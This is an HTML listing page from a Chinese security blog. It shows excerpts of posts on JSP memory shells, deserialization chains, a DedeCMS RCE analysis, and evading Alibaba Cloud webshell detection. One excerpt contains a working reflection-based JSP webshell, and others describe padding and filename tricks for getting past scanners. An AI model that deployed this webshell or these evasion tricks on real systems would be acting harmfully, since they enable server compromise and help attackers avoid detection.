@@ -1,0 +1,634 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Page 2 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/21/JSP文件无依赖加载shellcode分析/"><span>JSP文件无依赖加载shellcode分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/21/JSP文件无依赖加载shellcode分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-21T06:52:24.000Z">
+          2021-10-21
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    去年分析过JSP加载shellcode上线的技术，但是由于需要先上传DLL到目标主机，所以在真实环境下并不方便使用，最近看到<code>rebeyond</code>发表的关于<code>Java原生远程进程注入</code>的文章，可以实现无需依赖上传的<code>dll</code>实现<code>JSP</code>加载shellcode的功能，因此决定写下这篇文章分析和复现其中的技术。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/20/Java-Agent修改Shiro-key/"><span>Java Agent修改Shiro key</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/20/Java-Agent修改Shiro-key/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-20T05:40:29.000Z">
+          2021-10-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    之前佬哥给我提了个需求，如何修改<code>Shiro Key</code>，我们知道<code>Shiro</code>在高版本<code>key</code>默认是随机生成的，没有在配置文件中，即使在配置文件中配置了<code>key</code>,也要重启服务器完成修改也不太好，虽然之前知道可以通过<code>Java Agent</code>的方式完成修改，但当时没有了解过这个技术，最近刚好学习了<code>Java Agent</code>，所以抽空完成提过的需求。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞利用/">漏洞利用</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/20/hibernate1利用链分析/"><span>hibernate1利用链分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/20/hibernate1利用链分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-20T05:40:29.000Z">
+          2021-10-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​        最近做项目刚好遇到了反序列化漏洞，在项目中依赖了hibernate组件，借此机会分析下hibernate利用链。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        首先看下最终反序列化漏洞的触发点，这个漏洞的触发点在<code>org.hibernate.property.BasicPropertyAccessor.BasicGetter#get</code>中，在这这个方法中使用了method.invoke反射调用。这里的method是从属性中获取的，因此是可控的，所以下来需要找到可以控制target参数的点。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/反序列化/">反序列化</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/14/JSP内存马研究/"><span>JSP内存马研究</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/14/JSP内存马研究/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-14T02:03:17.000Z">
+          2021-10-14
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的<code>Servlet</code>和<code>Filter</code>拿出来，排查人员仔细一点还是会被查出来的，所以<strong>我们要找一些其他方式实现的内存马。比如我今天提到的JSP的内存马</strong>。</p>
+<h2 id="JSP加载流程分析"><a href="#JSP加载流程分析" class="headerlink" title="JSP加载流程分析"></a>JSP加载流程分析</h2><p>​    在Tomcat中<code>jsp</code>和<code>jspx</code>都会交给<code>JspServlet</code>处理，所以要想实现<code>JSP</code>驻留内存，首先得分析<code>JspServlet</code>的处理逻辑。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/内存马/">内存马</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/13/JavaAgent内存马研究/"><span>JavaAgent内存马研究</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/13/JavaAgent内存马研究/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-13T08:59:19.000Z">
+          2021-10-13
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近在研究<code>webshell</code>免杀，发现针对很多类型的内存马已经有了比较成型的检测方法，当然大多数内存马的查杀方式也是基于<code>javaAgent</code>，但是<code>rebeyond</code>前辈在文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10075">Java内存攻击技术漫谈</a>中给出了绕过检测工具的方法，理论上这种绕过会导致现有的基于<code>Agent</code>检测的工具无法使用，所以值得我们深入学习。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/内存马/">内存马</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/09/DedeCMS-RCE漏洞分析/"><span>DedeCMS RCE漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/09/DedeCMS-RCE漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-09T14:06:08.000Z">
+          2021-10-09
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近看到几个公众号都披露了DedeCMS的漏洞，很久也没有分析过PHP的漏洞了，趁着周末没什么事情分析下这两个漏洞。</p>
+<h2 id="V5-8-1内测版前台RCE"><a href="#V5-8-1内测版前台RCE" class="headerlink" title="V5.8.1内测版前台RCE"></a>V5.8.1内测版前台RCE</h2><p>​    这个漏洞在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KZ7O0JRLvk4_O1GvL5lMVw">这篇文章</a>有过分析，但我还是决定自己搭建好环境分析一下，以便自己能理解的更加深刻。</p>
+<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>​    在DedeCMS中，当访问出现某些异常，Dede会弹出一个窗口给用户提示。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/09/webshell免杀过阿里云asp/"><span>webshell免杀过阿里云asp</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/09/webshell免杀过阿里云asp/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-09T04:12:38.000Z">
+          2021-10-09
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="注释填充"><a href="#注释填充" class="headerlink" title="注释填充"></a>注释填充</h2><p>​    参考<code>Webshell-Detect-Bypass</code>项目<code>glorysday.asp</code>可以绕过阿里云的检测。这部分作者主要用了下面几个技巧。</p>
+<blockquote>
+<p>  利用<code>&#39;%&gt;</code>和<code>&#39;&lt;%</code>分别闭合前后标签填充大量垃圾<code>&lt;%%&gt;</code>标签，且最后文件体积大小要合适(测试发现文件大小约&gt;0.97 MB)</p>
+<p>在<strong>一定位置</strong>插入至少一个<code>&lt;??&gt;</code>字符串</p>
+</blockquote>
+<p>​    之前我在绕云WAF时，发现增加垃圾字符可以绕过云WAF的检测，所以我怀疑能绕过是因为大量垃圾字符的。于是我去除了<code>&#39;%&gt;</code>这部分，只使用大量的<code>&lt;%%&gt;</code>填充，也确实绕过了云查杀。但是如果使用其他字符填充无法绕过，所以我推测能绕过的原因是匹配<code>&lt;%%&gt;</code>的次数过多而导致的溢出。</p>
+<p>​    虽然大量填充可以绕过阿里云的查杀，但是这种方式在实战中并不可取，由于上传文件内容过大，导致在访问文件的过程中会有一些卡顿，一定程度上影响了客户端和webshell的交互。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/08/webshell免杀过阿里云PHP/"><span>webshell免杀过阿里云PHP</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/08/webshell免杀过阿里云PHP/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-08T06:27:41.000Z">
+          2021-10-08
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    基于之前成功绕过JSP的免杀经验，主要对抗的重点还是放在分离免杀，在<a target="_blank" rel="noopener" href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">这个</a>项目中也有一些关于RASP和沙箱对抗的经验，可以直接复用。</p>
+<h3 id="从文件名获取内容"><a href="#从文件名获取内容" class="headerlink" title="从文件名获取内容"></a>从文件名获取内容</h3><p>​    云查杀会将我们传入的文件重命名，因此我们可以利用真实的webshell和沙箱中的文件名不一致来绕过。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/09/29/webshell免杀笔记/"><span>webshell免杀笔记</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/09/29/webshell免杀笔记/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-09-29T02:24:02.000Z">
+          2021-09-29
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="更改接收参数方式"><a href="#更改接收参数方式" class="headerlink" title="更改接收参数方式"></a>更改接收参数方式</h2><h3 id="调用的类和方法参数化-失败"><a href="#调用的类和方法参数化-失败" class="headerlink" title="调用的类和方法参数化(失败)"></a>调用的类和方法参数化(失败)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	 String className = request.getParameter(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Class  A = Class.forName(className);</span><br><span class="line">        Constructor B =  A.getDeclaredConstructor();</span><br><span class="line">        B.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Method M = A.getMethod(request.getParameter(<span class="string">&quot;b&quot;</span>), String.class);</span><br><span class="line">        String D = request.getParameter(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">        M.invoke(B.newInstance(), D);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/09/24/负载均衡踩坑记/"><span>负载均衡踩坑记</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/09/24/负载均衡踩坑记/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-09-24T02:55:46.000Z">
+          2021-09-24
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​    事情是这样的，最近有个渗透的小伙伴找我，它通过shiro反序列化植入内存马获取了一个shell，但这台主机上有负载均衡，所以通过冰蝎、蚁剑等连接工具上传大文件会上传失败，需要我这边提供解决方案。</p>
+<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="问题一：为什么shell管理工具文件上传需要分包？"><a href="#问题一：为什么shell管理工具文件上传需要分包？" class="headerlink" title="问题一：为什么shell管理工具文件上传需要分包？"></a>问题一：为什么shell管理工具文件上传需要分包？</h3><p>​    我使用蚁剑做了测试，蚁剑配置shell可以在<code>其他设置</code>中设置分片的大小，默认是<code>500kb</code>，那有小伙伴可能要说了，那我将这个值改成一个比较大的值不就可以一次性上传大文件也就相当于解决了负载均衡的问题。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/安全研究/">安全研究</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+
+<nav class="pagination">
+  
+  <a href="/" class="pagination-prev">Prev</a>
+  
+  
+  <a href="/page/3/" class="pagination-next">Next</a>
+  
+</nav>
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
